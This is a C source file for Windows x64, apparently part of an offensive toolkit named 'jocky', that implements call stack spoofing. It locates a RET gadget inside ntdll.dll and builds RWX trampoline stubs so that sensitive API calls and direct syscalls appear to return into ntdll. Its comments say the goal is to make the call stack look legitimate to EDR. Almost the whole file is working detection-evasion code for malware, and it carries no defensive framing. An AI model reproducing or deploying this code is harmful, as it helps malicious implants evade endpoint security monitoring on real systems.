/*
 * Call Stack Spoofing
 *
 * Makes a sensitive API call appear to originate from a legitimate module
 * (ntdll.dll) by replacing the immediate return address with a RET gadget
 * found inside ntdll's .text section.
 *
 * Technique (single-frame trampoline, no assembly required):
 *
 *   Normal call stack during a sensitive API call:
 *     SensitiveApi  ← [rsp]  jocky_spoof_call+0x?? (our code, suspicious)
 *
 *   With stack spoofing:
 *     SensitiveApi  ← [rsp]  gadget (0xC3 ret inside ntdll.dll, legitimate)
 *                     [rsp+8] our real return address (deep in stack, not checked)
 *
 * Implementation — dynamically-generated trampoline stub (x64):
 *
 *   stub_entry:
 *     pop  rax                    ; save return-to-jocky-code address (the
 *                                 ; one call stub_entry pushed)
 *     mov  r11, <gadget_addr>     ; 64-bit gadget VA in ntdll.dll
 *     push rax                    ; push jocky return addr deeper (gadget's ret
 *                                 ; will pop this and return home)
 *     push r11                    ; push gadget as the visible return addr
 *     jmp  [rip+0]                ; jump to target_fn (8-byte ptr follows)
 *     .qword <target_fn>
 *
 *   When target_fn executes its ret:
 *     → pops gadget_addr → jumps to gadget
 *   Gadget (ret, 0xC3):
 *     → pops jocky_return_addr → returns to us
 *
 *   Call stack seen by an EDR during target_fn execution:
 *     target_fn  ←  ntdll!<gadget+offset>  (looks legitimate)
 *
 * Windows x64 only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ── Find a RET gadget in ntdll.dll ────────────────────────────────── */

/*
 * Scans ntdll.dll's .text section for a `ret; int3` byte pair (0xC3 0xCC),
 * which is a clean function-end ret gadget that won't cause an infinite
 * loop or side-effect if the gadget's own frame is examined.
 * Falls back to any 0xC3 byte in .text if no clean one is found.
 */
PVOID jocky_find_ret_gadget(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;

        BYTE*  text = (BYTE*)ntdll + sec[i].VirtualAddress;
        DWORD  sz   = sec[i].Misc.VirtualSize;

        /* Preferred: ret followed by int3 (clean function epilogue) */
        PVOID fallback = NULL;
        for (DWORD j = 0; j + 1 < sz; j++) {
            if (text[j] == 0xC3) {
                if (!fallback) fallback = text + j;
                if (text[j + 1] == 0xCC) return text + j; /* ret; int3 */
            }
        }
        return fallback;
    }
    return NULL;
}

/* ── Trampoline stub layout ─────────────────────────────────────────── */

#pragma pack(push, 1)
typedef struct {
    uint8_t  pop_rax;            /* 58                      */
    uint8_t  mov_r11_pfx[2];     /* 49 BB                   */
    uint64_t gadget_addr;        /* 8-byte gadget VA        */
    uint8_t  push_rax;           /* 50                      */
    uint8_t  push_r11[2];        /* 41 53                   */
    uint8_t  jmp_rip[6];         /* FF 25 00 00 00 00       */
    uint64_t target_fn;          /* 8-byte target VA        */
} spoof_stub_t;                  /* 28 bytes                */
#pragma pack(pop)

static spoof_stub_t* build_stub(PVOID gadget, PVOID target_fn)
{
    spoof_stub_t* s = (spoof_stub_t*)VirtualAlloc(NULL, 4096,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!s) return NULL;

    s->pop_rax          = 0x58;
    s->mov_r11_pfx[0]   = 0x49;
    s->mov_r11_pfx[1]   = 0xBB;
    s->gadget_addr      = (uint64_t)(uintptr_t)gadget;
    s->push_rax         = 0x50;
    s->push_r11[0]      = 0x41;
    s->push_r11[1]      = 0x53;
    s->jmp_rip[0]       = 0xFF;
    s->jmp_rip[1]       = 0x25;
    s->jmp_rip[2]       = 0x00;
    s->jmp_rip[3]       = 0x00;
    s->jmp_rip[4]       = 0x00;
    s->jmp_rip[5]       = 0x00;
    s->target_fn        = (uint64_t)(uintptr_t)target_fn;

    FlushInstructionCache(GetCurrentProcess(), s, sizeof(*s));
    return s;
}

/* ── Cached gadget (found once) ─────────────────────────────────────── */

static PVOID s_gadget = NULL;

static PVOID get_gadget(void)
{
    if (!s_gadget) s_gadget = jocky_find_ret_gadget();
    return s_gadget;
}

/* ── Public API ─────────────────────────────────────────────────────── */

/*
 * Call fn(a1, a2, a3, a4) with the return address replaced by a
 * RET gadget in ntdll.dll.  Falls back to a direct call if no gadget
 * is found or stub allocation fails.
 */
intptr_t jocky_spoof_call(PVOID fn,
                           uintptr_t a1, uintptr_t a2,
                           uintptr_t a3, uintptr_t a4)
{
    PVOID gadget = get_gadget();
    if (!gadget) {
        typedef intptr_t (*fn4_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
        return ((fn4_t)fn)(a1, a2, a3, a4);
    }

    spoof_stub_t* stub = build_stub(gadget, fn);
    if (!stub) {
        typedef intptr_t (*fn4_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
        return ((fn4_t)fn)(a1, a2, a3, a4);
    }

    typedef intptr_t (*stub_fn_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    intptr_t result = ((stub_fn_t)stub)(a1, a2, a3, a4);

    VirtualFree(stub, 0, MEM_RELEASE);
    return result;
}

/* ── Spoofed direct syscall ─────────────────────────────────────────── */

/*
 * Combination: stack-spoofed + direct syscall.
 *
 * The trampoline stub is extended to contain the syscall body instead of
 * jumping to a target function.  The gadget is pushed as the visible
 * return address so the kernel-to-user return looks like it lands in ntdll.
 *
 * Stub layout:
 *   pop  rax                 ; save our return addr
 *   mov  r11, gadget
 *   push rax                 ; deeper (gadget's ret pops this)
 *   push r11                 ; gadget visible on stack
 *   mov  r10, rcx            ; syscall convention
 *   mov  eax, ssn
 *   syscall
 *   ret                      ; pops gadget → jumps there → pops rax → home
 */

#pragma pack(push, 1)
typedef struct {
    uint8_t  pop_rax;           /* 58           */
    uint8_t  mov_r11_pfx[2];    /* 49 BB        */
    uint64_t gadget_addr;       /* 8 bytes      */
    uint8_t  push_rax;          /* 50           */
    uint8_t  push_r11[2];       /* 41 53        */
    uint8_t  mov_r10_rcx[3];    /* 4C 8B D1     */
    uint8_t  mov_eax;           /* B8           */
    uint32_t ssn;               /* 4 bytes      */
    uint8_t  syscall_bytes[2];  /* 0F 05        */
    uint8_t  ret;               /* C3           */
} spoof_sc_stub_t;              /* 25 bytes     */
#pragma pack(pop)

intptr_t jocky_spoof_syscall(uint32_t ssn,
                              uintptr_t a1, uintptr_t a2,
                              uintptr_t a3, uintptr_t a4)
{
    PVOID gadget = get_gadget();
    if (!gadget)
        return jocky_direct_syscall(ssn, a1, a2, a3, a4);

    spoof_sc_stub_t* s = (spoof_sc_stub_t*)VirtualAlloc(NULL, 4096,
                            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!s) return jocky_direct_syscall(ssn, a1, a2, a3, a4);

    s->pop_rax          = 0x58;
    s->mov_r11_pfx[0]   = 0x49;
    s->mov_r11_pfx[1]   = 0xBB;
    s->gadget_addr      = (uint64_t)(uintptr_t)gadget;
    s->push_rax         = 0x50;
    s->push_r11[0]      = 0x41;
    s->push_r11[1]      = 0x53;
    s->mov_r10_rcx[0]   = 0x4C;
    s->mov_r10_rcx[1]   = 0x8B;
    s->mov_r10_rcx[2]   = 0xD1;
    s->mov_eax          = 0xB8;
    s->ssn              = ssn;
    s->syscall_bytes[0] = 0x0F;
    s->syscall_bytes[1] = 0x05;
    s->ret              = 0xC3;

    FlushInstructionCache(GetCurrentProcess(), s, sizeof(*s));

    typedef intptr_t (*fn4_t)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    intptr_t result = ((fn4_t)s)(a1, a2, a3, a4);

    VirtualFree(s, 0, MEM_RELEASE);
    return result;
}

#endif /* _WIN32 */
